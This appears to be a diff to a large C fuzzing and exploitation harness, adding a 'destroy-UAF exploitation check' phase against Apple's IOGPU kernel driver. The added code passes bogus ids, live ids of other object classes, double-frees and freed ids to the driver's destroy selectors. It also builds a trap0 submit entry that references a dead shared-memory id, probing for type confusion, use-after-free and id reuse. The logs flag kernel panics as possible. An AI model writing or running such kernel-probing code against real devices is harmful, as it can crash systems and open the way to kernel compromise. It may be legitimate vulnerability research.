@@ -18919,6 +18919,268 @@ static void p_iogpusweep(void) {
     if (r.c) IOServiceClose(r.c);
 }
 
+// V139: p_destroyuaf — exploitation check of the iogpusweep finding
+// (run-iogpusweep-full.log): destroy selectors of the IOGPU type-1 client
+// ACCEPT garbage ids with kr 0. Per the map (docs/agx_queue_execution.md §2):
+//   sel7  s_delete_command_queue      {qid u64}
+//   sel9  s_delete_resource           {rid u32}
+//   sel13 s_destroy_shmem             {shmem id u32}
+//   sel15 s_destroy_notificationqueue {nqid u64}
+// kr 0 on a bogus id can mean (i) a validated reject that still returns
+// success, (ii) a silent no-op, or (iii) a lookup+free on a wrong/invalid
+// slot — type confusion / OOB free. This phase measures which, on our own
+// connect with our own objects. Per class:
+//   (a) destroy of nonexistent ids {0, 1, id+1000, 0xffffffff}: kr + survival
+//       of the real marked objects (marker readback + liveness probes);
+//   (b) type confusion: a LIVE id of ANOTHER class passed to this destroy
+//       (queue id into resource-destroy etc.) — PANIC possible;
+//   (c) double-destroy of the real id — free-path reentrancy;
+//   (d) destroy + immediate kernel-side use of the dead id (probe call;
+//       for shmem a trap0 submit entry referencing the dead id) — UAF deref;
+//   (e) destroy + recreate: id reuse? content integrity of the new object.
+// One fresh connect per class so corruption from one class can't taint the
+// next. fsync+LOG before every destroy/use (crash-resume: FUZZ_DESTROYUAF_SKIP
+// counts destroy/use calls in execution order — 13 per class × 4 classes).
+// Env: FUZZ_DESTROYUAF=1, FUZZ_DESTROYUAF_SKIP=N. Tag [duf].
+typedef struct {
+    io_connect_t c;
+    uint32_t ridM, ridW;
+    uint8_t *cpuM, *cpuW;
+    uint64_t gvaM, gvaW;
+    uint64_t qM, qW;
+    uint32_t shM, shW;
+    uint8_t *vaM, *vaW;
+    uint64_t nqM, nqW;
+} dufx;
+typedef struct {
+    uint32_t dsel;
+    const char *nm;
+    uint64_t idM, idW;
+} dufcls;
+
+static long duf_cn, duf_skip;
+
+static int duf_next(void) {   // case bookkeeping: 1 = execute
+    return duf_cn++ >= duf_skip;
+}
+
+static kern_return_t duf_kill1(dufx *x, uint32_t sel, uint64_t id, const char *tag, int panicnote) {
+    if (!duf_next()) return (kern_return_t)-1;
+    LOG("[duf] case #%ld %s: sel%u {0x%llx}%s", duf_cn - 1, tag, sel,
+        (unsigned long long)id, panicnote ? " (PANIC possible)" : "");
+    fsync(fileno(stderr));
+    uint64_t a[1] = { id };
+    kern_return_t kr = IOConnectCallScalarMethod(x->c, sel, a, 1, NULL, NULL);
+    LOG("[duf]   -> kr 0x%08x (we survived)", (unsigned)kr);
+    return kr;
+}
+// liveness probes (kernel touches the object; kr 0 ~ alive)
+static int duf_res_alive(dufx *x, uint32_t rid) {
+    if (!rid) return 0;
+    uint64_t a[2] = { rid, 0 };
+    kern_return_t kr = IOConnectCallScalarMethod(x->c, 11, a, 2, NULL, NULL);
+    LOG("[duf]   probe rid %u (sel11): kr 0x%08x %s", rid, (unsigned)kr, kr ? "DEAD?" : "alive");
+    return kr == 0;
+}
+static int duf_queue_alive(dufx *x, uint64_t qid) {
+    if (!qid) return 0;
+    uint8_t z[12];
+    memset(z, 0, sizeof z);
+    uint64_t a[1] = { qid };
+    kern_return_t kr = IOConnectCallMethod(x->c, 26, a, 1, z, sizeof z, NULL, NULL, NULL, NULL);
+    LOG("[duf]   probe qid %llu (sel26): kr 0x%08x %s", qid, (unsigned)kr, kr ? "DEAD?" : "alive");
+    return kr == 0;
+}
+static int duf_nq_alive(dufx *x, uint64_t nqid) {
+    if (!nqid) return 0;
+    uint64_t a[2] = { x->qM, nqid };
+    kern_return_t kr = IOConnectCallScalarMethod(x->c, 24, a, 2, NULL, NULL);
+    LOG("[duf]   probe nqid %llu (sel24 bind): kr 0x%08x %s", nqid, (unsigned)kr,
+        kr ? "DEAD?" : "alive");
+    return kr == 0;
+}
+static void duf_checkall(dufx *x, const char *tag) {
+    long bm = -1, bw = -1, sm = -1, sw = -1, i;
+    if (x->cpuM) { bm = 0; for (i = 0; i < 0x10000; i += 0x40) if (x->cpuM[i] != 0x41) bm++; }
+    if (x->cpuW) { bw = 0; for (i = 0; i < 0x10000; i += 0x40) if (x->cpuW[i] != 0x41) bw++; }
+    if (x->vaM)  { sm = 0; for (i = 0; i < 0x4000; i += 0x40) if (x->vaM[i] != 0x42) sm++; }
+    if (x->vaW)  { sw = 0; for (i = 0; i < 0x4000; i += 0x40) if (x->vaW[i] != 0x42) sw++; }
+    LOG("[duf] %s: markers bad resM %ld/1024 resW %ld/1024 shM %ld/256 shW %ld/256%s",
+        tag, bm, bw, sm, sw,
+        ((bm > 0) || (bw > 0) || (sm > 0) || (sw > 0)) ? " [HIT CONTENT CORRUPTION]" : "");
+    duf_res_alive(x, x->ridM);
+    duf_res_alive(x, x->ridW);
+    duf_queue_alive(x, x->qM);
+    duf_queue_alive(x, x->qW);
+    duf_nq_alive(x, x->nqM);
+    duf_nq_alive(x, x->nqW);
+}
+static int duf_setup(dufx *x) {
+    memset(x, 0, sizeof *x);
+    x->c = open_service("IOGPU", 1);
+    if (!x->c) { LOG("[duf] setup: open failed"); return 0; }
+    x->nqM = ios_mknq(x->c);
+    x->qM = ios_mkqueue(x->c);
+    if (!x->qM) { LOG("[duf] setup: no queue"); IOServiceClose(x->c); x->c = 0; return 0; }
+    uint64_t a24[2] = { x->qM, x->nqM };
+    kern_return_t kr = IOConnectCallScalarMethod(x->c, 24, a24, 2, NULL, NULL);
+    x->ridM = gpu_resource2(x->c, 0x10000, &x->gvaM, &x->cpuM);
+    x->shM = gpu_shmem_t(x->c, 0x4000, 1, &x->vaM);
+    // witness objects of the same classes (neighbor-corruption canaries)
+    x->qW = ios_mkqueue(x->c);
+    x->nqW = ios_mknq(x->c);
+    x->ridW = gpu_resource2(x->c, 0x10000, &x->gvaW, &x->cpuW);
+    x->shW = gpu_shmem_t(x->c, 0x4000, 1, &x->vaW);
+    if (x->cpuM) memset(x->cpuM, 0x41, 0x10000);
+    if (x->cpuW) memset(x->cpuW, 0x41, 0x10000);
+    if (x->vaM) memset(x->vaM, 0x42, 0x4000);
+    if (x->vaW) memset(x->vaW, 0x42, 0x4000);
+    LOG("[duf] setup: qM %llu nqM %llu ridM %u shM %u | qW %llu nqW %llu ridW %u shW %u "
+        "bind 0x%08x", x->qM, x->nqM, x->ridM, x->shM, x->qW, x->nqW, x->ridW, x->shW,
+        (unsigned)kr);
+    return 1;
+}
+// (d) immediate kernel-side use of the just-destroyed id
+static void duf_use_dead(dufx *x, const dufcls *k, uint64_t id) {
+    if (!duf_next()) return;
+    long n = duf_cn - 1;
+    if (k->dsel == 9) {
+        LOG("[duf] case #%ld d-use: sel11 set_purgeable on DEAD rid 0x%llx (UAF deref?)", n,
+            (unsigned long long)id);
+        fsync(fileno(stderr));
+        uint64_t a[2] = { id, 0 };
+        kern_return_t kr = IOConnectCallScalarMethod(x->c, 11, a, 2, NULL, NULL);
+        LOG("[duf]   -> kr 0x%08x (we survived)", (unsigned)kr);
+    } else if (k->dsel == 7) {
+        LOG("[duf] case #%ld d-use: touch DEAD queue 0x%llx (sel26 + sel24, UAF deref?)", n,
+            (unsigned long long)id);
+        fsync(fileno(stderr));
+        uint8_t z[12];
+        memset(z, 0, sizeof z);
+        uint64_t a[1] = { id };
+        kern_return_t k1 = IOConnectCallMethod(x->c, 26, a, 1, z, sizeof z, NULL, NULL, NULL, NULL);
+        uint64_t b[2] = { id, x->nqM };
+        kern_return_t k2 = IOConnectCallScalarMethod(x->c, 24, b, 2, NULL, NULL);
+        LOG("[duf]   -> sel26 0x%08x sel24 0x%08x (we survived)", (unsigned)k1, (unsigned)k2);
+    } else if (k->dsel == 15) {
+        LOG("[duf] case #%ld d-use: sel24 bind DEAD nqid 0x%llx (UAF deref?)", n,
+            (unsigned long long)id);
+        fsync(fileno(stderr));
+        uint64_t b[2] = { x->qM, id };
+        kern_return_t kr = IOConnectCallScalarMethod(x->c, 24, b, 2, NULL, NULL);
+        LOG("[duf]   -> kr 0x%08x (we survived)", (unsigned)kr);
+    } else {   // sel13 shmem: trap0 submit entry referencing the DEAD shmem id
+        LOG("[duf] case #%ld d-use: trap0 submit with DEAD shmem id 0x%llx (UAF deref?)", n,
+            (unsigned long long)id);
+        fsync(fileno(stderr));
+        uint8_t *entry = must_map(0x1000);
+        uint8_t *comp = must_map(0x1000);
+        uint32_t *outw = must_map(0x100);
+        memset(entry, 0, 0x1000);
+        memset(comp, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = (uint32_t)id;   // dead kcmd shmem id
+        *(uint32_t *)(entry + 0x04) = x->shW;         // live seglist
+        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
+        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
+        *outw = 0xdeadbeef;
+        kern_return_t kt = ioconnect_trap4(x->c, 0, x->qM, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        LOG("[duf]   -> trap0 kr 0x%08x outw %08x (we survived)", (unsigned)kt, *outw);
+        usleep(100000);
+        vm_deallocate(mach_task_self(), (vm_address_t)entry, 0x1000);
+        vm_deallocate(mach_task_self(), (vm_address_t)comp, 0x1000);
+        vm_deallocate(mach_task_self(), (vm_address_t)outw, 0x100);
+    }
+}
+static uint64_t duf_recreate(dufx *x, const dufcls *k) {   // (e)
+    if (k->dsel == 9) {
+        uint64_t g = 0;
+        uint8_t *cp = NULL;
+        uint32_t r = gpu_resource2(x->c, 0x10000, &g, &cp);
+        if (cp) memset(cp, 0x41, 0x10000);
+        LOG("[duf]   recreated rid %u (cpu %p)", r, cp);
+        return r;
+    }
+    if (k->dsel == 7) {
+        uint64_t q = ios_mkqueue(x->c);
+        LOG("[duf]   recreated qid %llu", q);
+        return q;
+    }
+    if (k->dsel == 13) {
+        uint8_t *v = NULL;
+        uint32_t s = gpu_shmem_t(x->c, 0x4000, 1, &v);
+        if (v) memset(v, 0x42, 0x4000);
+        LOG("[duf]   recreated shmem %u", s);
+        return s;
+    }
+    uint64_t nq = ios_mknq(x->c);
+    LOG("[duf]   recreated nqid %llu", nq);
+    return nq;
+}
+static void duf_run_class(dufx *x, const dufcls *k) {
+    LOG("[duf] === class %s: destroy sel%u (main 0x%llx witness 0x%llx) ===",
+        k->nm, k->dsel, (unsigned long long)k->idM, (unsigned long long)k->idW);
+    // (a) nonexistent ids
+    uint64_t bogus[4] = { 0, 1, k->idM + 1000, 0xffffffffULL };
+    for (int i = 0; i < 4; i++) {
+        duf_kill1(x, k->dsel, bogus[i], "a-bogus", 1);
+        duf_checkall(x, "after a-bogus");
+    }
+    // (b) type confusion: LIVE foreign-class ids
+    uint64_t cross[3];
+    if (k->dsel == 9)       { cross[0] = x->qM;   cross[1] = x->shM;  cross[2] = x->nqM; }
+    else if (k->dsel == 7)  { cross[0] = x->ridM; cross[1] = x->shM;  cross[2] = x->nqM; }
+    else if (k->dsel == 13) { cross[0] = x->ridM; cross[1] = x->qM;   cross[2] = x->nqM; }
+    else                    { cross[0] = x->ridM; cross[1] = x->qM;   cross[2] = x->shM; }
+    for (int i = 0; i < 3; i++) {
+        duf_kill1(x, k->dsel, cross[i], "b-typeconf", 1);
+        duf_checkall(x, "after b-typeconf");
+    }
+    // (c) double destroy of the real id
+    duf_kill1(x, k->dsel, k->idM, "c-destroy#1", 1);
+    duf_kill1(x, k->dsel, k->idM, "c-destroy#2-same", 1);
+    duf_checkall(x, "after c-double");
+    // (d) destroy + immediate kernel use
+    duf_kill1(x, k->dsel, k->idW, "d-destroy", 1);
+    duf_use_dead(x, k, k->idW);
+    duf_checkall(x, "after d-use");
+    // (e) destroy + recreate (id reuse? content integrity?)
+    duf_kill1(x, k->dsel, k->idM, "e-destroy", 0);
+    uint64_t nid = duf_recreate(x, k);
+    LOG("[duf]   e-recreate: new id 0x%llx — %s", (unsigned long long)nid,
+        nid && nid == k->idM ? "ID REUSED" : (nid ? "fresh id" : "FAILED"));
+    duf_checkall(x, "after e-recreate");
+    duf_kill1(x, k->dsel, nid, "e-cleanup-new", 0);
+}
+static void p_destroyuaf(void) {
+    duf_skip = atol(getenv("FUZZ_DESTROYUAF_SKIP") ?: "0");
+    duf_cn = 0;
+    LOG("[duf] v139 destroy-UAF exploitation check: skip %ld", duf_skip);
+    static const struct { uint32_t dsel; const char *nm; } cl[4] = {
+        { 9,  "resource" },
+        { 7,  "command_queue" },
+        { 13, "shmem" },
+        { 15, "notification_queue" },
+    };
+    for (int ci = 0; ci < 4; ci++) {
+        dufx x;
+        if (!duf_setup(&x)) continue;
+        dufcls k;
+        k.dsel = cl[ci].dsel;
+        k.nm = cl[ci].nm;
+        switch (k.dsel) {
+            case 9:  k.idM = x.ridM; k.idW = x.ridW; break;
+            case 7:  k.idM = x.qM;   k.idW = x.qW;   break;
+            case 13: k.idM = x.shM;  k.idW = x.shW;  break;
+            default: k.idM = x.nqM;  k.idW = x.nqW;  break;
+        }
+        duf_run_class(&x, &k);
+        LOG("[duf] class %s finished; closing connect", k.nm);
+        fsync(fileno(stderr));
+        IOServiceClose(x.c);
+    }
+    LOG("[duf] done: %ld cases (skip %ld) (alive)", duf_cn, duf_skip);
+}
+
 // V115: p_killrace — widen the restartWorkQueue / getGuiltyChannel race.
 // p_mtlmut case #929: a blit cb with kcmd+0x150 patched 0x268 -> 0xffffffff
 // deterministically faults the GPU and kills the app (2/2 repro). Static
@@ -24840,6 +25102,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_DSRECON")) { p_dsrecon(); LOG("[probe13] dsrecon-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CBCHAIN")) { p_cbchain(); LOG("[probe13] cbchain-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IOGPUSWEEP")) { p_iogpusweep(); LOG("[probe13] iogpusweep-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_DESTROYUAF")) { p_destroyuaf(); LOG("[probe13] destroyuaf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_REPLAY2")) { p_replay2(); LOG("[probe13] replay2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IOCMD")) { p_iocmd(); LOG("[probe13] iocmd-only mode, stop"); return NULL; }
         if (getenv("FUZZ_HIDFUZZ")) { p_hidfuzz(); LOG("[probe13] hidfuzz-only mode, stop"); return NULL; }
